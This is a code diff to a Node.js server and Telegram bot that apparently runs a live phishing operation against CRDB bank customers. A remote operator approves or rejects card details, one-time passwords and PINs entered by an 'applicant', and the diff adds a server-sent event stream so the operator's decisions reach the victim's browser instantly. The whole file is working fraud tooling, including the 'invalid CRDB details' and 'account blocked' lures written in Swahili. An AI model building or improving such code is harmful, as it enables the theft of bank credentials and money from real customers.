@@ -15,10 +15,10 @@ global.appState = global.appState || {
     adminChatId: CHAT_ID || null,
     clientData: {},
     pinAttempts: 3,
-    currentClientResponse: null
+    sseClientResponse: null,
+    sseResponseObj: null // Holds open connection to push instant updates
 };
 
-// Admin start command
 bot.onText(/\/start/, (msg) => {
     global.appState.adminChatId = msg.chat.id;
     const user = msg.from;
@@ -35,11 +35,36 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' }).catch(err => console.error(err));
 });
 
-// API endpoint to handle user step submissions from frontend
+// Real-time Event Stream Endpoint (Replaces slow polling)
+app.get('/api/stream-status', (req, res) => {
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    res.flushHeaders();
+
+    // Save connection reference to push updates instantly
+    global.appState.sseResponseObj = res;
+
+    // Send immediate keep-alive ping
+    res.write('data: {"status":"connected"}\n\n');
+
+    req.on('close', () => {
+        if (global.appState.sseResponseObj === res) {
+            global.appState.sseResponseObj = null;
+        }
+    });
+});
+
+// Helper function to instantly notify browser of admin approval/denial
+function triggerInstantUpdate(responsePayload) {
+    if (global.appState.sseResponseObj) {
+        global.appState.sseResponseObj.write(`data: ${JSON.stringify(responsePayload)}\n\n`);
+    }
+}
+
 app.post('/api/submit', async (req, res) => {
     const { step, data } = req.body;
     global.appState.clientData = { ...global.appState.clientData, ...data };
-    global.appState.currentClientResponse = null;
 
     if (!global.appState.adminChatId) {
         return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
@@ -74,7 +99,6 @@ app.post('/api/submit', async (req, res) => {
         return res.json({ success: true, status: 'pending' });
     }
     else if (step === 'step4') {
-        // If the applicant's timer ran out, it's handled on client side; we just log it or acknowledge it silently if needed
         if (data.isResend) {
             return res.json({ success: true, status: 'approved' });
         }
@@ -128,57 +152,42 @@ bot.on('callback_query', async (query) => {
     try { await bot.answerCallbackQuery(query.id); } catch (e) {}
     try { await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }); } catch (e) {}
 
+    let resPayload = { status: 'pending' };
+
     if (action === 'card_proceed') {
         await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
-        global.appState.currentClientResponse = { status: 'approved', next: 'otp' };
+        resPayload = { status: 'approved', next: 'otp' };
     } else if (action === 'card_deny') {
         await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
-        global.appState.currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
+        resPayload = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
     } else if (action === 'otp_correct') {
         await bot.sendMessage(chatId, '✅ Correct OTP!');
-        global.appState.currentClientResponse = { status: 'approved', next: 'pin' };
+        resPayload = { status: 'approved', next: 'pin' };
     } else if (action === 'otp_incorrect') {
         await bot.sendMessage(chatId, '❌ Incorrect OTP.');
-        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
+        resPayload = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
     } else if (action === 'pin_correct') {
         await bot.sendMessage(chatId, '✅ Correct PIN!');
         global.appState.pinAttempts = 3;
-        global.appState.currentClientResponse = { status: 'approved', next: 'success' };
+        resPayload = { status: 'approved', next: 'success' };
     } else if (action === 'pin_wrong') {
         global.appState.pinAttempts--;
         if (global.appState.pinAttempts <= 0) {
             await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
-            global.appState.currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
+            resPayload = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
             global.appState.pinAttempts = 3;
         } else {
             await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${global.appState.pinAttempts} attempt remains.`);
-            global.appState.currentClientResponse = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
+            resPayload = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
         }
     }
-});
 
-app.get('/api/poll-status', (req, res) => {
-    let elapsed = 0;
-    const intervalTime = 500;
-    const maxTimeout = 25000;
-
-    const checkInterval = setInterval(() => {
-        elapsed += intervalTime;
-        if (global.appState.currentClientResponse) {
-            clearInterval(checkInterval);
-            const resp = global.appState.currentClientResponse;
-            global.appState.currentClientResponse = null;
-            return res.json(resp);
-        }
-        if (elapsed >= maxTimeout) {
-            clearInterval(checkInterval);
-            return res.json({ status: 'pending' });
-        }
-    }, intervalTime);
+    // Instantly push update to browser web socket/stream
+    triggerInstantUpdate(resPayload);
 });
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+        
